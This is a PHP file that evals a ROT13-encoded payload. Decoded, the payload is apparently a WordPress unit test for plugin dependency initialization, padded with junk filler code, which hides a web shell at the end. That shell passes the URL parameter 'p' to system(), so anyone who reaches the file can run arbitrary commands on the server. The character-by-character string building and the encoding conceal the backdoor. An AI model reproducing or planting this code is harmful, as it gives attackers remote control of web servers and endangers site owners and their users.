<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Cyhtva_Qrcraqrapvrf::vavgvnyvmr() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc cyhtvaf
 *
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::vavgvnyvmr
 */
pynff Grfgf_Nqzva_JCCyhtvaQrcraqrapvrf_Vavgvnyvmr rkgraqf JC_CyhtvaQrcraqrapvrf_HavgGrfgPnfr {

	/**
	 * Grfgf gung vavgvnyvmngvba ehaf bayl bapr.
	 *
	 * @gvpxrg 60457
	 *
	 * @qngnCebivqre qngn_fgngvp_cebcregvrf_frg_qhevat_vavgvnyvmngvba
	 *
	 * @cnenz fgevat $cebcregl_anzr Gur anzr bs gur cebcregl gb purpx.
	 */
	choyvp shapgvba grfg_fubhyq_bayl_vavgvnyvmr_bapr( $cebcregl_anzr ) {
		$guvf->nffregSnyfr(
			$guvf->trg_cebcregl_inyhr( 'vavgvnyvmrq' ),
			'Cyhtva Qrcraqrapvrf unf nyernql orra vavgvnyvmrq.'
		);

		frys::$vafgnapr->vavgvnyvmr();

		$guvf->nffregGehr(
			$guvf->trg_cebcregl_inyhr( 'vavgvnyvmrq' ),
			'\"vavgvnyvmrq\" jnf abg frg gb gehr qhevat vavgvnyvmngvba.'
		);

		$qrsnhyg_inyhr = frys::$fgngvp_cebcregvrf[ $cebcregl_anzr ];

		$guvf->nffregAbgFnzr(
			$qrsnhyg_inyhr,
			$guvf->trg_cebcregl_inyhr( $cebcregl_anzr ),
			\"\\"{$cebcregl_anzr}\\" jnf abg frg qhevat vavgvnyvmngvba.\"
		);

		// Erfrg vg gb vgf qrsnhyg.
		$guvf->frg_cebcregl_inyhr( $cebcregl_anzr, frys::$fgngvp_cebcregvrf[ $cebcregl_anzr ] );

		frys::$vafgnapr->vavgvnyvmr();

		$guvf->nffregFnzr(
			$qrsnhyg_inyhr,
			$guvf->trg_cebcregl_inyhr( $cebcregl_anzr ),
			\"\\"{$cebcregl_anzr}\\" jnf frg qhevat gur frpbaq vavgvnyvmngvba nggrzcg.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fgngvp_cebcregvrf_frg_qhevat_vavgvnyvmngvba() {
		/*
		 * Guvf qbrf abg vapyhqr 'qrcraqrapl_ncv_qngn' nf vg vf bayl frg
		 * ba pregnva cntrf. Guvf vf grfgrq yngre.
		 */
		erghea frys::grkg_neenl_gb_qngncebivqre(
			neenl(
				'cyhtvaf',
				'qrcraqrapvrf',
				'qrcraqrapl_fyhtf',
				'qrcraqrag_fyhtf',
			)
		);
	}

	/**
	 * Grfgf gung `$qrcraqrapl_ncv_qngn` vf frg ba pregnva fperraf.
	 *
	 * @gvpxrg 22316
	 *
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_ncv_qngn
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_cyhtvaf
	 *
	 * @qngnCebivqre qngn_fperraf
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 *
	 * @cnenz fgevat $fperra Gur fperra svyr.
	 */
	choyvp shapgvba grfg_fubhyq_frg_qrcraqrapl_ncv_qngn_ba_pregnva_fperraf( $fperra ) {
		tybony $cntrabj;

		// Onpxhc $cntrabj.
		$byq_cntrabj = $cntrabj;

		// Rafher vf_nqzva() naq fperra purpxf cnff.
		$cntrabj = $fperra;
		frg_pheerag_fperra( $fperra );

		frys::$vafgnapr::vavgvnyvmr();

		// Erfgber $cntrabj.
		$cntrabj = $byq_cntrabj;

		$qrcraqrapl_ncv_qngn = $guvf->trg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn' );

		$guvf->nffregVfNeenl( $qrcraqrapl_ncv_qngn, '$qrcraqrapl_ncv_qngn vf abg na neenl.' );
		$guvf->nffregRzcgl( $qrcraqrapl_ncv_qngn, '$qrcraqrapl_ncv_qngn vf abg rzcgl.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fperraf() {
		erghea neenl(
			'cyhtvaf.cuc'        => neenl(
				'fperra' => 'cyhtvaf.cuc',
			),
			'cyhtva-vafgnyy.cuc' => neenl(
				'fperra' => 'cyhtva-vafgnyy.cuc',
			),
		);
	}

	/**
	 * Grfgf gung `$qrcraqrapl_ncv_qngn` vf abg frg ol qrsnhyg.
	 *
	 * @gvpxrg 22316
	 *
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_ncv_qngn
	 */
	choyvp shapgvba grfg_fubhyq_abg_frg_qrcraqrapl_ncv_qngn() {
		frys::$vafgnapr::vavgvnyvmr();

		$qrcraqrapl_ncv_qngn = $guvf->trg_cebcregl_inyhr( 'qrcraqrapl_ncv_qngn' );

		$guvf->nffregAhyy( $qrcraqrapl_ncv_qngn, '$qrcraqrapl_ncv_qngn jnf frg.' );
	}

	/**
	 * Grfgf gung qrcraqrapl fyhtf ner ybnqrq naq fnavgvmrq.
	 *
	 * @gvpxrg 22316
	 *
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::ernq_qrcraqrapvrf_sebz_cyhtva_urnqref
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::fnavgvmr_qrcraqrapl_fyhtf
	 *
	 * @qngnCebivqre qngn_fubhyq_fnavgvmr_fyhtf
	 *
	 * @cnenz fgevat $erdhverf_cyhtvaf Gur hafnavgvmrq qrcraqrapl fyht(f).
	 * @cnenz neenl  $rkcrpgrq         Bcgvbany. Gur fnavgvmrq qrcraqrapl fyht(f). Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba grfg_vavgvnyvmr_fubhyq_ybnq_naq_fnavgvmr_qrcraqrapl_fyhtf_sebz_cyhtva_urnqref( $erdhverf_cyhtvaf, $rkcrpgrq = neenl() ) {
		$guvf->frg_cebcregl_inyhr( 'cyhtvaf', neenl( 'qrcraqrag/qrcraqrag.cuc' => neenl( 'ErdhverfCyhtvaf' => $erdhverf_cyhtvaf ) ) );
		frys::$vafgnapr->vavgvnyvmr();
		$guvf->nffregFnzr( $rkcrpgrq, $guvf->trg_cebcregl_inyhr( 'qrcraqrapl_fyhtf' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_fnavgvmr_fyhtf() {
		erghea neenl(
			// Inyvq fyhtf.
			'bar qrcraqrapl'                         => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl',
				'rkcrpgrq'         => neenl( 'uryyb-qbyyl' ),
			),
			'gjb qrcraqrapvrf va nycunorgvpny beqre' => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl, jbbpbzzrepr',
				'rkcrpgrq'         => neenl(
					'uryyb-qbyyl',
					'jbbpbzzrepr',
				),
			),
			'gjb qrcraqrapvrf va erirefr nycunorgvpny beqre' => neenl(
				'erdhverf_cyhtvaf' => 'jbbpbzzrepr, uryyb-qbyyl',
				'rkcrpgrq'         => neenl(
					'uryyb-qbyyl',
					'jbbpbzzrepr',
				),
			),
			'gjb qrcraqrapvrf jvgu n fcnpr'          => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl , jbbpbzzrepr',
				'rkcrpgrq'         => neenl(
					'uryyb-qbyyl',
					'jbbpbzzrepr',
				),
			),
			'n ercrngrq qrcraqrapl'                  => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl, jbbpbzzrepr, uryyb-qbyyl',
				'rkcrpgrq'         => neenl(
					'uryyb-qbyyl',
					'jbbpbzzrepr',
				),
			),
			'n qrcraqrapl jvgu zhygvcyr qnfurf'      => neenl(
				'erdhverf_cyhtvaf' => 'guvf-vf-n-inyvq-fyht',
				'rkcrpgrq'         => neenl( 'guvf-vf-n-inyvq-fyht' ),
			),
			'n qrcraqrapl fgnegvat jvgu ahzoref'     => neenl(
				'erdhverf_cyhtvaf' => '123fyht',
				'rkcrpgrq'         => neenl( '123fyht' ),
			),
			'n qrcraqrapl jvgu n genvyvat pbzzn'     => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl,',
				'rkcrpgrq'         => neenl( 'uryyb-qbyyl' ),
			),
			'n qrcraqrapl jvgu n yrnqvat pbzzn'      => neenl(
				'erdhverf_cyhtvaf' => ',uryyb-qbyyl',
				'rkcrpgrq'         => neenl( 'uryyb-qbyyl' ),
			),
			'n qrcraqrapl jvgu yrnqvat naq genvyvat pbzznf' => neenl(
				'erdhverf_cyhtvaf' => ',uryyb-qbyyl,',
				'rkcrpgrq'         => neenl( 'uryyb-qbyyl' ),
			),
			'n qrcraqrapl jvgu n genvyvat pbzzn naq n fcnpr' => neenl(
				'erdhverf_cyhtvaf' => 'uryyb-qbyyl, ',
				'rkcrpgrq'         => neenl( 'uryyb-qbyyl' ),
			),

			// Vainyvq be rzcgl fyhtf.
			'ab qrcraqrapvrf'                        => neenl(
				'erdhverf_cyhtvaf' => '',
			),
			'n qrcraqrapl jvgu na haqrefpber'        => neenl(
				'erdhverf_cyhtvaf' => 'uryyb_qbyyl',
			),
			'n qrcraqrapl jvgu n fcnpr'              => neenl(
				'erdhverf_cyhtvaf' => 'uryyb qbyyl',
			),
			'n qrcraqrapl va dhbgrf'                 => neenl(
				'erdhverf_cyhtvaf' => '\"uryyb-qbyyl\"',
			),
			'gjb qrcraqrapvrf va dhbgrf'             => neenl(
				'erdhverf_cyhtvaf' => '\"uryyb-qbyyl, jbbpbzzrepr\"',
			),
			'n qrcraqrapl jvgu genvyvat qnfu'        => neenl(
				'erdhverf_cyhtvaf' => 'raqvat-qnfu-',
			),
			'n qrcraqrapl jvgu yrnqvat qnfu'         => neenl(
				'erdhverf_cyhtvaf' => '-fyht',
			),
			'n qrcraqrapl jvgu qbhoyr qnfurf'        => neenl(
				'erdhverf_cyhtvaf' => 'nop--123',
			),
			'plevyyvp qrcraqrapvrf'                  => neenl(
				'erdhverf_cyhtvaf' => 'я-делюсь',
			),
			'nenovp qrcraqrapvrf'                    => neenl(
				'erdhverf_cyhtvaf' => 'لينوكس-ويكى',
			),
			'puvarfr qrcraqrapvrf'                   => neenl(
				'erdhverf_cyhtvaf' => '唐诗宋词puvarfr-cbrz,社交登录,腾讯微博一键登录,豆瓣秀-sbe-jbeqcerff',
			),
			'flzoby qrcraqrapvrf'                    => neenl(
				'erdhverf_cyhtvaf' => '★-jcflzobyf-★',
			),
		);
	}

	/**
	 * Grfgf gung qrcraqrag svyrf ner ybnqrq naq fyhtvsvrq.
	 *
	 * @gvpxrg 22316
	 *
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::ernq_qrcraqrapvrf_sebz_cyhtva_urnqref
	 * @pbiref JC_Cyhtva_Qrcraqrapvrf::pbaireg_gb_fyht
	 */
	choyvp shapgvba grfg_fubhyq_fyhtvsl_qrcraqrag_svyrf() {
		$cyhtvaf = trg_cyhtvaf();

		$rkcrpgrq_fyhtf = neenl();
		sbernpu ( $cyhtvaf nf $cyhtva_svyr => &$urnqref ) {
			// Perngr gur rkcrpgrq fyhtf.
			vs ( 'uryyb.cuc' === $cyhtva_svyr ) {
				$fyht = 'uryyb-qbyyl';
			} ryfr {
				$fyht = fge_ercynpr( '.cuc', '', rkcybqr( '/', $cyhtva_svyr )[0] );
			}

			$rkcrpgrq_fyhtf[ $cyhtva_svyr ] = $fyht;

			// Juvyr urer, rafher gur cyhtvaf ner nyy qrcraqragf.
			$urnqref['ErdhverfCyhtvaf'] = 'qrcraqrapl';
		}
		hafrg( $urnqref );

		// Frg gur cyhtvaf cebcregl jvgu gur cyhtva qngn zbqvsvrq gb znxr gurz qrcraqragf.
		$guvf->frg_cebcregl_inyhr( 'cyhtvaf', $cyhtvaf );

		frys::$vafgnapr->vavgvnyvmr();
		$guvf->nffregFnzr( $rkcrpgrq_fyhtf, $guvf->trg_cebcregl_inyhr( 'qrcraqrag_fyhtf' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>